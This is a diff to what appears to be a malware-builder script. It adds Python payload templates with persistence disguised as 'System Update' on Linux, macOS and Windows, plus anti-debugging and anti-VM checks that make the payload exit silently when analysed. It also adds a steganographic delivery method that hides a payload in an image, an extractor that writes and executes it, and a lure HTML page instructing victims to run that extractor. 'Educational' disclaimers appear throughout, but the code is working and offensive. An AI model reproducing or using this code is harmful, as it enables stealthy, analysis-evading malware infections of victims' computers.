@@ -3883,6 +5101,25 @@ exit \$RETVAL
                     f.write(f"#!/bin/bash\n{exe_path} &\n")
                 os.chmod(profile_path, 0o755)
                 
+            elif PERSISTENCE_METHOD == "desktop_shortcut":
+                # Create .desktop file
+                desktop_dir = os.path.expanduser("~/.config/autostart")
+                if not os.path.exists(desktop_dir):
+                    os.makedirs(desktop_dir)
+                    
+                desktop_file = os.path.join(desktop_dir, "system-update.desktop")
+                if not os.path.exists(desktop_file):
+                    with open(desktop_file, "w") as f:
+                        f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Update
+Exec={exe_path}
+Icon=system-software-update
+Terminal=false
+Categories=System;
+""")
+                    os.chmod(desktop_file, 0o755)
+                
         elif system == "Darwin":  # macOS
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
@@ -3955,10 +5192,86 @@ end tell
                 
                 subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                 os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "dock_shortcut":
+                # Add to Dock
+                dock_script = f'''
+tell application "System Events"
+    tell dock preferences
+        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
+    end tell
+end tell
+'''
+                subprocess.run(["osascript", "-e", dock_script], check=False)
             
     except Exception as e:
         # Silently handle errors in educational context
         pass
+
+def anti_debug_check():
+    """Check for debugging environment"""
+    if not ANTI_DEBUG_ENABLED:
+        return False
+        
+    try:
+        # Check for common debuggers
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
+        for debugger in debuggers:
+            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
+                return True
+                
+        # Check for debugging flags
+        if hasattr(sys, 'gettrace') and sys.gettrace():
+            return True
+            
+        # Timing check
+        start = time.time()
+        time.sleep(0.1)
+        end = time.time()
+        if (end - start) > 0.15:
+            return True
+            
+        return False
+    except:
+        return False
+
+def anti_vm_check():
+    """Check for virtualization environment"""
+    if not ANTI_VM_ENABLED:
+        return False
+        
+    try:
+        vm_indicators = [
+            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
+        ]
+        
+        for indicator in vm_indicators:
+            if os.path.exists(indicator):
+                with open(indicator, 'r') as f:
+                    content = f.read().lower()
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
+                        return True
+        
+        # Check MAC address
+        try:
+            import uuid
+            mac = uuid.getnode()
+            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
+                return True
+        except:
+            pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                return True
+        
+        return False
+    except:
+        return False
 
 def execute_payload():
     setup_persistence()
@@ -3966,6 +5279,11 @@ def execute_payload():
     time.sleep(2)
 
 def main():
+    # Anti-analysis checks
+    if anti_debug_check() or anti_vm_check():
+        # Exit silently if detected
+        sys.exit(0)
+    
     if FAKE_GUI:
         t = threading.Thread(target=execute_payload)
         t.daemon = True
@@ -3994,11 +5312,19 @@ import platform
 import subprocess
 import os
 import threading
+import base64
+import tempfile
+import shutil
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
 PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
+
+# Anti-detection
+ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
+ANTI_VM_ENABLED = $ANTI_VM_ENABLED
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -4062,6 +5388,35 @@ def setup_persistence():
                 # Create scheduled task
                 task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                 subprocess.run(task_cmd, shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "lnk_file":
+                # Create LNK file on desktop
+                import pythoncom
+                from win32com.shell import shell, shellcon
+                
+                desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
+                shortcut_path = os.path.join(desktop, "System Update.lnk")
+                
+                if not os.path.exists(shortcut_path):
+                    shortcut = pythoncom.CoCreateInstance(
+                        shell.CLSID_ShellLink, None,
+                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
+                    )
+                    shortcut.SetPath(exe_path)
+                    shortcut.SetDescription("System Update")
+                    shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
+                    
+                    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                    persist_file.Save(shortcut_path, 0)
+            
+            elif PERSISTENCE_METHOD == "shell_extension":
+                # Add to right-click context menu
+                reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
+                    
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
                 
         elif system == "Linux":
             # Get current executable path
@@ -4168,6 +5523,25 @@ exit \$RETVAL
                     f.write(f"#!/bin/bash\n{exe_path} &\n")
                 os.chmod(profile_path, 0o755)
                 
+            elif PERSISTENCE_METHOD == "desktop_shortcut":
+                # Create .desktop file
+                desktop_dir = os.path.expanduser("~/.config/autostart")
+                if not os.path.exists(desktop_dir):
+                    os.makedirs(desktop_dir)
+                    
+                desktop_file = os.path.join(desktop_dir, "system-update.desktop")
+                if not os.path.exists(desktop_file):
+                    with open(desktop_file, "w") as f:
+                        f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Update
+Exec={exe_path}
+Icon=system-software-update
+Terminal=false
+Categories=System;
+""")
+                    os.chmod(desktop_file, 0o755)
+                
         elif system == "Darwin":  # macOS
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
@@ -4240,10 +5614,86 @@ end tell
                 
                 subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                 os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "dock_shortcut":
+                # Add to Dock
+                dock_script = f'''
+tell application "System Events"
+    tell dock preferences
+        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
+    end tell
+end tell
+'''
+                subprocess.run(["osascript", "-e", dock_script], check=False)
             
     except Exception as e:
         # Silently handle errors in educational context
         pass
+
+def anti_debug_check():
+    """Check for debugging environment"""
+    if not ANTI_DEBUG_ENABLED:
+        return False
+        
+    try:
+        # Check for common debuggers
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
+        for debugger in debuggers:
+            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
+                return True
+                
+        # Check for debugging flags
+        if hasattr(sys, 'gettrace') and sys.gettrace():
+            return True
+            
+        # Timing check
+        start = time.time()
+        time.sleep(0.1)
+        end = time.time()
+        if (end - start) > 0.15:
+            return True
+            
+        return False
+    except:
+        return False
+
+def anti_vm_check():
+    """Check for virtualization environment"""
+    if not ANTI_VM_ENABLED:
+        return False
+        
+    try:
+        vm_indicators = [
+            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
+        ]
+        
+        for indicator in vm_indicators:
+            if os.path.exists(indicator):
+                with open(indicator, 'r') as f:
+                    content = f.read().lower()
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
+                        return True
+        
+        # Check MAC address
+        try:
+            import uuid
+            mac = uuid.getnode()
+            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
+                return True
+        except:
+            pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                return True
+        
+        return False
+    except:
+        return False
 
 class CustomPayload:
     def __init__(self):
@@ -4270,6 +5720,11 @@ def execute_payload():
     payload.run()
 
 def main():
+    # Anti-analysis checks
+    if anti_debug_check() or anti_vm_check():
+        # Exit silently if detected
+        sys.exit(0)
+    
     if FAKE_GUI:
         t = threading.Thread(target=execute_payload)
         t.daemon = True
@@ -4383,7 +5838,7 @@ import time
 
 def check_debugger():
     try:
-        debuggers = ['gdb', 'lldb', 'strace', 'ltrace']
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
         for debugger in debuggers:
             if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
                 # print(f'Debugger detected: {debugger}')
@@ -4401,7 +5856,13 @@ def check_timing():
         return True
     return False
 
-if check_debugger() or check_timing():
+def check_trace():
+    if hasattr(sys, 'gettrace') and sys.gettrace():
+        # print('Trace function detected')
+        return True
+    return False
+
+if check_debugger() or check_timing() or check_trace():
     # print('Debugging environment detected - exiting')
     sys.exit(0)
 EOF
@@ -4418,26 +5879,34 @@ def check_vm():
     try:
         vm_indicators = [
             '/proc/vz', '/proc/xen', '/dev/virtio-ports',
-            '/sys/class/dmi/id/product_name'
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
         ]
         
         for indicator in vm_indicators:
             if os.path.exists(indicator):
                 with open(indicator, 'r') as f:
                     content = f.read().lower()
-                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm']):
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
                         # print('Virtualization detected')
                         return True
         
+        # Check MAC address
         try:
             import uuid
             mac = uuid.getnode()
             mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
-            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56')):
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
                 # print('VM MAC address detected')
                 return True
         except:
             pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                # print('VM process detected')
+                return True
         
         return False
     except:
@@ -4486,6 +5955,9 @@ deliver_payload() {
         "cloudflare_tunnel")
             deliver_via_cloudflare_tunnel "$payload_path" "$delivery_targets"
             ;;
+        "image_steganography")
+            deliver_via_image_steganography "$payload_path" "$delivery_targets"
+            ;;
         *)
             log_message "ERROR" "Unknown delivery method: $delivery_method"
             return 1
@@ -4493,6 +5965,349 @@ deliver_payload() {
     esac
     
     return $?
+}
+
+deliver_via_image_steganography() {
+    local payload_path=$1
+    local output_image=$2
+    
+    echo -e "${Y}[*] Preparing image steganography delivery...${NC}"
+    
+    if [ ! -f "$IMAGE_FILE" ]; then
+        log_message "ERROR" "Image file not found: $IMAGE_FILE"
+        return 1
+    fi
+    
+    # Create a Python script for steganography
+    local stego_script="$TEMP_DIR/steganography.py"
+    cat > "$stego_script" << EOF
+#!/usr/bin/env python3
+import os
+import sys
+from PIL import Image
+import base64
+import io
+
+def hide_payload_in_image(image_path, payload_path, output_path):
+    try:
+        # Open the image
+        img = Image.open(image_path)
+        
+        # Read the payload
+        with open(payload_path, 'rb') as f:
+            payload_data = f.read()
+        
+        # Encode the payload as base64
+        encoded_payload = base64.b64encode(payload_data).decode('utf-8')
+        
+        # Add a delimiter to mark the end of the payload
+        payload_with_delimiter = encoded_payload + "###END###"
+        
+        # Convert the image to RGB if it's not
+        if img.mode != 'RGB':
+            img = img.convert('RGB')
+        
+        # Get image dimensions
+        width, height = img.size
+        
+        # Check if the image is large enough to hide the payload
+        max_payload_size = (width * height * 3) // 8  # 1 bit per color channel
+        if len(payload_with_delimiter) > max_payload_size:
+            print(f"Error: Payload too large for this image. Max size: {max_payload_size} bytes")
+            return False
+        
+        # Convert image to pixel data
+        pixels = list(img.getdata())
+        
+        # Convert payload to binary
+        payload_binary = ''.join([format(ord(char), '08b') for char in payload_with_delimiter])
+        
+        # Hide the payload in the least significant bits of the image pixels
+        modified_pixels = []
+        payload_index = 0
+        
+        for i in range(len(pixels)):
+            r, g, b = pixels[i]
+            
+            # Modify the least significant bit of each color channel
+            if payload_index < len(payload_binary):
+                r = (r & 0xFE) | int(payload_binary[payload_index])
+                payload_index += 1
+            
+            if payload_index < len(payload_binary):
+                g = (g & 0xFE) | int(payload_binary[payload_index])
+                payload_index += 1
+            
+            if payload_index < len(payload_binary):
+                b = (b & 0xFE) | int(payload_binary[payload_index])
+                payload_index += 1
+            
+            modified_pixels.append((r, g, b))
+        
+        # Create a new image with the modified pixels
+        new_img = Image.new('RGB', (width, height))
+        new_img.putdata(modified_pixels)
+        
+        # Save the new image
+        new_img.save(output_path)
+        
+        print(f"Payload hidden in image: {output_path}")
+        return True
+        
+    except Exception as e:
+        print(f"Error hiding payload in image: {e}")
+        return False
+
+def extract_payload_from_image(image_path, output_path):
+    try:
+        # Open the image
+        img = Image.open(image_path)
+        
+        # Convert image to RGB if it's not
+        if img.mode != 'RGB':
+            img = img.convert('RGB')
+        
+        # Get pixel data
+        pixels = list(img.getdata())
+        
+        # Extract the least significant bits
+        binary_data = ""
+        
+        for r, g, b in pixels:
+            binary_data += str(r & 1)
+            binary_data += str(g & 1)
+            binary_data += str(b & 1)
+        
+        # Convert binary to string
+        payload = ""
+        for i in range(0, len(binary_data), 8):
+            if i + 8 <= len(binary_data):
+                byte = binary_data[i:i+8]
+                payload += chr(int(byte, 2))
+                
+                # Check for the delimiter
+                if payload.endswith("###END###"):
+                    payload = payload[:-9]  # Remove the delimiter
+                    break
+        
+        # Decode the base64 payload
+        decoded_payload = base64.b64decode(payload)
+        
+        # Write the payload to the output file
+        with open(output_path, 'wb') as f:
+            f.write(decoded_payload)
+        
+        print(f"Payload extracted to: {output_path}")
+        return True
+        
+    except Exception as e:
+        print(f"Error extracting payload from image: {e}")
+        return False
+
+if __name__ == "__main__":
+    if len(sys.argv) < 4:
+        print("Usage: python3 steganography.py <mode> <input> <output> [payload]")
+        print("Modes: hide, extract")
+        sys.exit(1)
+    
+    mode = sys.argv[1]
+    input_path = sys.argv[2]
+    output_path = sys.argv[3]
+    
+    if mode == "hide":
+        if len(sys.argv) < 5:
+            print("Error: Payload path required for hide mode")
+            sys.exit(1)
+        
+        payload_path = sys.argv[4]
+        if hide_payload_in_image(input_path, payload_path, output_path):
+            print("Payload successfully hidden in image")
+            sys.exit(0)
+        else:
+            print("Failed to hide payload in image")
+            sys.exit(1)
+    
+    elif mode == "extract":
+        if extract_payload_from_image(input_path, output_path):
+            print("Payload successfully extracted from image")
+            sys.exit(0)
+        else:
+            print("Failed to extract payload from image")
+            sys.exit(1)
+    
+    else:
+        print("Error: Invalid mode. Use 'hide' or 'extract'")
+        sys.exit(1)
+EOF
+    
+    set_executable "$stego_script"
+    
+    # Hide the payload in the image
+    echo -e "${Y}[*] Hiding payload in image...${NC}"
+    if python3 "$stego_script" hide "$IMAGE_FILE" "$payload_path" "$output_image"; then
+        log_message "SUCCESS" "Payload hidden in image: $output_image"
+        
+        # Create an extractor script for the target
+        local extractor_script="$DELIVERY_DIR/extractor.py"
+        cat > "$extractor_script" << EOF
+#!/usr/bin/env python3
+import os
+import sys
+import tempfile
+import subprocess
+from PIL import Image
+import base64
+
+def extract_and_execute(image_path):
+    try:
+        # Create a temporary file for the extracted payload
+        with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as temp_file:
+            temp_path = temp_file.name
+        
+        # Extract the payload from the image
+        subprocess.run([sys.executable, "-c", '''
+import sys
+from PIL import Image
+import base64
+
+def extract_payload_from_image(image_path, output_path):
+    try:
+        # Open the image
+        img = Image.open(image_path)
+        
+        # Convert image to RGB if it's not
+        if img.mode != "RGB":
+            img = img.convert("RGB")
+        
+        # Get pixel data
+        pixels = list(img.getdata())
+        
+        # Extract the least significant bits
+        binary_data = ""
+        
+        for r, g, b in pixels:
+            binary_data += str(r & 1)
+            binary_data += str(g & 1)
+            binary_data += str(b & 1)
+        
+        # Convert binary to string
+        payload = ""
+        for i in range(0, len(binary_data), 8):
+            if i + 8 <= len(binary_data):
+                byte = binary_data[i:i+8]
+                payload += chr(int(byte, 2))
+                
+                # Check for the delimiter
+                if payload.endswith("###END###"):
+                    payload = payload[:-9]  # Remove the delimiter
+                    break
+        
+        # Decode the base64 payload
+        decoded_payload = base64.b64decode(payload)
+        
+        # Write the payload to the output file
+        with open(output_path, "wb") as f:
+            f.write(decoded_payload)
+        
+        return True
+        
+    except Exception as e:
+        return False
+
+if extract_payload_from_image("''' + image_path + '''", "''' + temp_path + '''"):
+    print("Payload extracted successfully")
+else:
+    print("Failed to extract payload")
+    sys.exit(1)
+'''])
+        
+        # Make the extracted payload executable
+        os.chmod(temp_path, 0o755)
+        
+        # Execute the payload
+        subprocess.Popen([temp_path], shell=True)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("Usage: python3 extractor.py <image_path>")
+        sys.exit(1)
+    
+    image_path = sys.argv[1]
+    if extract_and_execute(image_path):
+        print("Payload extracted and executed")
+    else:
+        print("Failed to extract and execute payload")
+        sys.exit(1)
+EOF
+        
+        set_executable "$extractor_script"
+        
+        # Create a simple HTML file to display the image
+        local html_file="$DELIVERY_DIR/image_viewer.html"
+        cat > "$html_file" << EOF
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Viewer</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
+        .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .image-container { text-align: center; margin: 20px 0; }
+        .image-container img { max-width: 100%; border: 1px solid #ddd; border-radius: 5px; }
+        .instructions { background-color: #e8f0fe; padding: 15px; border-radius: 5px; margin: 20px 0; }
+        .download-btn { display: inline-block; background-color: #4285f4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin: 10px 0; }
+        .download-btn:hover { background-color: #3367d6; }
+        .footer { text-align: center; margin-top: 30px; color: #666; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Image Viewer</h1>
+        <div class="image-container">
+            <img src="$(basename "$output_image")" alt="Image">
+        </div>
+        <div class="instructions">
+            <h3>Instructions:</h3>
+            <p>1. Download the image using the button below.</p>
+            <p>2. Run the following command to extract and execute the hidden payload:</p>
+            <pre>python3 extractor.py $(basename "$output_image")</pre>
+        </div>
+        <div style="text-align: center;">
+            <a href="$(basename "$output_image")" class="download-btn" download>Download Image</a>
+            <a href="extractor.py" class="download-btn" download>Download Extractor</a>
+        </div>
+        <div class="footer">
+            <p>This image viewer is for educational purposes only.</p>
+            <p>&copy; $(date +%Y) Educational Tools</p>
+        </div>
+    </div>
+</body>
+</html>
+EOF
+        
+        # Copy the extractor script to the delivery directory
+        cp "$extractor_script" "$DELIVERY_DIR/"
+        
+        # Copy the steganographic image to the delivery directory
+        cp "$output_image" "$DELIVERY_DIR/"
+        
+        echo -e "${G}[+] Image steganography delivery prepared.${NC}"
+        echo -e "${G}[+] Steganographic image: $output_image${NC}"
+        echo -e "${G}[+] Extractor script: $extractor_script${NC}"
+        echo -e "${G}[+] HTML viewer: $html_file${NC}"
+        
+        log_message "SUCCESS" "Image steganography delivery completed"
+        return 0
+    else
+        log_message "ERROR" "Failed to hide payload in image"
+        return 1
+    fi
 }
 
 deliver_via_cloudflare_tunnel() {
